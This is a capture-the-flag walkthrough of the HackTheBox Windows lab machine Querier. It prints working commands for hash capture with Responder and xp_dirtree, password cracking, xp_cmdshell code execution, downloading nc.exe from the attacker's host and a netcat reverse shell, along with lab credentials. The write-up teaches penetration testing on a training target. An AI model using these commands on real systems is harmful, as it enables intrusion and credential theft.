@@ -1,0 +1,121 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Querier HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/querier-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-19T14:43:26+00:00">February 19, 2021</time><time class="updated" datetime="2025-06-22T12:39:07+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Querier. It was created by <span style="color: #0000ff;"><strong>mrh4sh </strong></span>&amp; <span style="color: #0000ff;"><strong>egre55</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating SMB Shares</span></li>
+<li><span style="color: #000000;">Inspecting xlsm File</span></li>
+<li><span style="color: #000000;">Enumerating ‘reporting’ credentials</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Connecting to MsSQL service</span></li>
+<li><span style="color: #000000;">Capturing Hashes using Responder</span></li>
+<li><span style="color: #000000;">Cracking Hashes using John the Ripper</span></li>
+<li><span style="color: #000000;">Exploiting xp_cmdshell RCE to get shell</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Group Policy Passwords</span></li>
+<li><span style="color: #000000;">Connecting Administrator using EvilWinRM</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.1.147</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.1.147</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bilQHDZZH1M/YC_K11GAq-I/AAAAAAAAt9I/sITo7UHTRfsNJQ5uYiJIJKSSgHnlmpGhACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: SMB (139), MsSQL (1433).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We will start our enumeration with the SMB port. To do this we will connect to the target machine’s SMB service using the smbclient tool as shown in the image below. We see that there are multiple shares but the point of interest is Reports. We enumerate Reports to find an Excel File. In order to inspect this file closely, we download it to our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 10.129.1.147
+smbclient //10.129.1.147/Reports</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qwh6u4bPzjg/YC_K9AV9dqI/AAAAAAAAt9M/nL5XghNl3Y8hb_HUPIv4Q-9v8heSyIOFgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">A simple file command gives us that it is a Microsoft Excel 2007 file. The excel files are basically packed as an archive file. This means that we can extract its contents. After extracting we got a directory by the name of xl. After traversing inside we got a vbaProject.bin file. We can take a look at it using the stings command. It gave us the credentials to connect to the MsSQL service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">file 'Currency Volume Report.xlsm'
+unzip 'Currency Volume Report.xlsm'
+cd xl
+strings vbaProject.bin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kolZengicaE/YC_LCcpIQKI/AAAAAAAAt9Q/5ML92mp54lAVpLw-coe7Wjxok18ZZRJhwCLcBGAsYHQ/s16000/4.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">User:     reporting
+Password: PcwTWTHRwryjc$c6</pre>
+<p><span style="color: #000000;">Then to connect to the MsSQL service we will be using the mssqlclient.py script. It is a part of the impacket tool kit. So, we downloaded and installed the impacket tool kit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+python setup.py install</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cgFd26kAv-w/YC_LG8UYG3I/AAAAAAAAt9Y/RvZ9kDWQtwkvvE1aEkK88tkFFQ96fyHyQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">After the installation, we used the mssqlclient form impacket tool to login in as reporting user using the password we just enumerated. After logging in, we used the help command to see the possible commands. Here we saw xp_cmdshell. We try to enable it but we receive an error that the user is not authorized to enable this.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 mssqlclient.py -windows-auth querier/reporting@10.129.1.147
+enable_xp_cmdshell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fxXbolOZz1E/YC_LLb86opI/AAAAAAAAt9c/b4qYWFPvfJgQCCUl-F7eMqeNgTRF3wN3QCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">But this hit us, in order to tell us that the user is not authorized there must be an authorization check going on. We can manipulate the target machine to send us the challenge and the password hash if we turn on the responder. We started the responder on tun0</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">responder -I tun0</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_BAlC0itoiE/YC_LQwGo2YI/AAAAAAAAt9k/illCGKtu2JUg901CKjHIAZj13kFqZLLFgCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Now in order to initial the authentication process, we ran xp_dirtree on the SQL shell we had.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_dirtree "\\10.10.14.64\raj"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u0L8C9HELmU/YC_LX8sZKlI/AAAAAAAAt9s/IgGfzSKc_RgRLqHQSRTikZCu9PU48bynACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We check the responder. It has captured some hashes as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9Qu-ARXMK7s/YC_LcumChmI/AAAAAAAAt90/x-z29A3Cbi4mhJJd2H_gfH04zOH9XdHxwCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">To crack those hashes, we went to check the responder logs located at the /usr/share/responder/logs.</span></p>
+<p><span style="color: #000000;">Then, we use john the ripper to crack the hash present in the responder logs and we found the credentials cracked.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.129.1.147.txt
+corporate568</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E1Wv2i6E1Q0/YC_Lm67InTI/AAAAAAAAt-A/TR7FnRJlCWYFpWL6ltJCg8dGhvWv_e4FQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<h4><span style="color: #000000;">Establishing Code Execution</span></h4>
+<p><span style="color: #000000;">Using mssqlclient.py we logged in and got the SQL shell as before. This time when we tried to enable the xp_cmdshell. We reconfigured xp_cmdshell so that it can execute commands directly. We tried the whoami command. This is now a Remote Code Execution.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 mssqlclient.py -windows-auth querier/mssql-svc@10.129.1.147
+RECONFIGURE
+xp_cmdshell "whoami"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v55YuHAj3oA/YC_LtVGf0fI/AAAAAAAAt-E/HfrUUc7Rd8M64MP1EAFmdbol99rSmddcQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">We looked for nc.exe and found it in /usr/share/windows-binaries. Then using python, we transferred the nc.exe to the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/windows-binaries
+python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tvkCbHIFcjM/YC_LyE6pJUI/AAAAAAAAt-M/5v5gGWTWCf8i7gW4zCe4abiyZREloyeZACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We will download it by executing a command in xp_cmdshell. The command runs a PowerShell instance and then uses the Invoke-WebRequest cmdlet to download the nc.exe hosted on port 8000 of our local machine. We sent it to the user directory of mssql-svc.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.64:8000/nc.exe -OutFile C:\Users\mssql-svc\nc.exe "</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kBARFGQ_Egc/YC_L3VmztqI/AAAAAAAAt-U/nZhA9n2IKDoV1jZdnSjVc6Vzz4iDqT_JgCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">As we are on the point of downloading the nc.exe why don’t we take this time to download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe">WinPEAS</a> </strong></span>as well</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.64:8000/winPEAS.exe -OutFile C:\Users\mssql-svc\winPEAS.exe "</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L103u5ynKpw/YC_L-esO04I/AAAAAAAAt-c/MTunnplfFW0WTze5ncLejkmP3vrs_BAMACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Now again using the xp_cmdshell we tried to create a shell for our local machine. Ensure to create a netcat listener at your local machine before executing the command form xp_cmdshell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">xp_cmdshell "c:\users\mssql-svc\nc.exe -e cmd.exe 10.10.14.64 4444"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_YFFkOZPyzg/YC_MPLIjRxI/AAAAAAAAt-s/ExXOWibnMbg44qeQx203_Nt9TR_VfC_dACLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the shell on the target machine. We can read the user flag here.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">In order to enumerate for elevating the privilege to Administrator, we ran the WinPEAS that we uploaded earlier on the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\users\mssql-svc
+WinPEAS.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KBuAabcSL3A/YC_MULMWPGI/AAAAAAAAt-w/116RLvfX5joCb0CDinlxVRvKzvxtUZn4wCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Running for a few moments WinPEAS stumbled upon the Group Policy Password that is mostly encrypted but WinPEAS was kind enough to give us the credentials in cleartext.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: Administrator
+Password: MyUnclesAreMarioAndLuigi!!1!</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uwcdAA1apj4/YC_MZA0BxAI/AAAAAAAAt-0/t24Fv5CJMRcdIuagbhgzOqPbg2E09jk1wCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We used the EvilWinRM to login in as Administrator on the target machine. After logging in we enumerated for the Root flag and then concluded the machine by reading the root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.1.147 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-exHZ29x9UOE/YC_Md6RDJbI/AAAAAAAAt-4/wrmLxZ84Kuc9phhBwijfTbX7ayHKdRdcgCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
